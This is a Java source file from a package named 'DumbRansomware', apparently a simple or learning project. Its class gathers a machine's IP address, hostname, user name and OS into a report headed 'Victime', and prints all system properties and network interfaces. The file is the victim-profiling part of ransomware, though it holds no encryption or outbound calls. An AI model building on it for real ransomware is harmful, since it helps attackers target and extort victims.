package DumbRansomware;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.UnknownHostException;
import java.util.Collections;
import java.util.Enumeration;
import java.util.Properties;

public class DumbCustomerReader {
    public static DumbCustomerReader reader;
    private String Ip;
    private String Hote;
    private String Utilisateur;
    private String OS;
    private DumbCustomerReader(String ip, String hote, String utilisateur, String os){
        Ip=ip;
        Hote=hote;
        Utilisateur = utilisateur;
        OS = os;
    }

    public static DumbCustomerReader getInstance(){
        if(reader==null){
            try{
                InetAddress inetadr = InetAddress.getLocalHost();
                String ip = inetadr.getHostAddress();
                String hote = inetadr.getHostName();
                String utilisateur = System.getProperty("user.name");
                String os = System.getProperty("os.name");
                reader = new DumbCustomerReader(ip, hote, utilisateur,os);
            }catch(UnknownHostException e){
                reader = new DumbCustomerReader("", "","","");
            }
             
        }
        return reader;
    }
    
    public String toString(){
        return String.format("Victime : \nIP : %s \nNom de la machine : %s\nUtilisateur : %s\nOS : %s",GetIp(),GetHote(),GetUtilisateur(),GetOS());
    }

    public void showFullProperties(){
        Properties props = System.getProperties();
        props.list(System.out);
        System.out.println("");
        System.out.println("--- Liste réseaux ---");
        try{
            Enumeration<NetworkInterface> nets = NetworkInterface.getNetworkInterfaces();
        
            for(NetworkInterface netint : Collections.list(nets)){
                System.out.printf("Display name : %s\n",netint.getDisplayName());
                System.out.printf("Name : %s\n",netint.getName());
                Enumeration<InetAddress> inetAddresses = netint.getInetAddresses();
                for(InetAddress inetAddress : Collections.list(inetAddresses)){
                    System.out.printf("     InetAddress: %s\n",inetAddress);
                }
            }   
        }catch(Exception e){}
        
            

    }

    public String GetIp(){return Ip;}
    public String GetHote(){return Hote;}
    public String GetUtilisateur(){return Utilisateur;}
    public String GetOS(){return OS;}
}
